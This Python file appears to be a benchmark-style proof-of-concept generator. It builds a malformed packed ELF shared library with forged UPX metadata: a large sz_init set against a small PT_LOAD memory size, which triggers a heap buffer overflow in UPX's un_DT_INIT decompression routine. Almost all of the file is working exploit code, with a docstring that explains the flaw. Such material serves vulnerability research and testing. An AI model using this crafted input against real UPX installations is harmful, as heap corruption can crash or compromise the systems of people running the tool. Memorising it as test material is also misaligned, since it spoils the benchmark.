import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap buffer overflow in the UPX decompressor.

        The vulnerability exists in the `un_DT_INIT` function when processing a
        packed ELF shared library (`ET_DYN`). This function is responsible for
        handling the `.init` section relocation. The vulnerable version of UPX
        reads data from the packed file into an in-memory buffer (`lowmem`) using
        a size (`sz_init`) and offset (`off_init`) specified in the UPX metadata
        within the packed file itself.

        The `lowmem` buffer is allocated based on the `p_memsz` value of a
        `PT_LOAD` segment. By crafting a packed ELF with a `PT_LOAD` segment
        that has a small `p_memsz` (e.g., 256 bytes) and setting a very large
        `sz_init` in the UPX metadata (e.g., 65535), the `fi->read(lowmem, sz_init)`
        call in `un_DT_INIT` will write far beyond the bounds of the `lowmem`
        buffer, causing a heap overflow.

        This PoC constructs such a malicious ELF file with the following key parts:
        1. An ELF header specifying `e_type = ET_DYN` and 3 program headers.
        2. A `PT_DYNAMIC` program header to ensure the `un_DT_INIT` function is called.
        3. A `PT_LOAD` program header with a small `p_memsz` (256) which defines
           the size of the buffer that will be overflown.
        4. UPX-specific metadata structures (`l_info`, `b_info`, `p_info`) placed at
           the end of the file, as expected by the decompressor.
        5. Malicious values for `sz_init` (0xffff) and `off_init` (0) embedded
           within the metadata, pointed to by `p_info.pi_dyn_off`.
        """
        poc = bytearray(512)

        # ELF Header (64 bytes)
        e_ident = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
        
        e_type = 3      # ET_DYN (Shared object file)
        e_machine = 62  # EM_X86_64
        e_version = 1
        e_entry = 0
        e_phoff = 64
        e_shoff = 0
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 56
        e_phnum = 3
        e_shentsize = 0
        e_shnum = 0
        e_shstrndx = 0

        header = e_ident
        header += struct.pack('<HHIQQQ', e_type, e_machine, e_version, e_entry, e_phoff, e_shoff)
        header += struct.pack('<IHHHHHH', e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx)
        poc[0:len(header)] = header

        # Program Headers (3 * 56 = 168 bytes, offset 64)
        phdr0 = struct.pack('<IIQQQQQQ', 1, 5, 0, 0, 0, 0x1000, 0x1000, 0x1000)
        phdr1 = struct.pack('<IIQQQQQQ', 1, 6, 444, 0x1000, 0x1000, 48, 256, 0x1000)
        phdr2 = struct.pack('<IIQQQQQQ', 2, 6, 232, 0x2000, 0x2000, 32, 32, 8)

        phdrs = phdr0 + phdr1 + phdr2
        poc[64:64+len(phdrs)] = phdrs

        # Fake Dynamic Segment (offset 232, size 32)
        dt_init = struct.pack('<qQ', 12, 0xdeadbeef) # DT_INIT tag
        dt_null = struct.pack('<qQ', 0, 0)           # DT_NULL tag
        dyn_seg = dt_init + dt_null
        poc[232:232+len(dyn_seg)] = dyn_seg

        # UPX metadata block (offset 444, size 32)
        b_info = struct.pack('<LL4B', 0x1000, 16, 0, 0, 0, 0)
        p_info = struct.pack('<4H', 232, 0, 20, 0)
        mal_data = struct.pack('<HH', 0xffff, 0)
        padding = b'\x00' * 8
        
        metadata_block = b_info + p_info + mal_data + padding
        poc[444:444+len(metadata_block)] = metadata_block

        # l_info struct (offset 492, size 20)
        l_info = struct.pack('<LBBBBLLL',
            0x58505521, # !UPX magic
            0x99,       # version
            13,         # l_format for ELF DYN
            0,          # filter
            0,          # filters
            0,          # unused
            512,        # filesize
            32          # blocksize
        )
        poc[492:492+len(l_info)] = l_info

        return bytes(poc)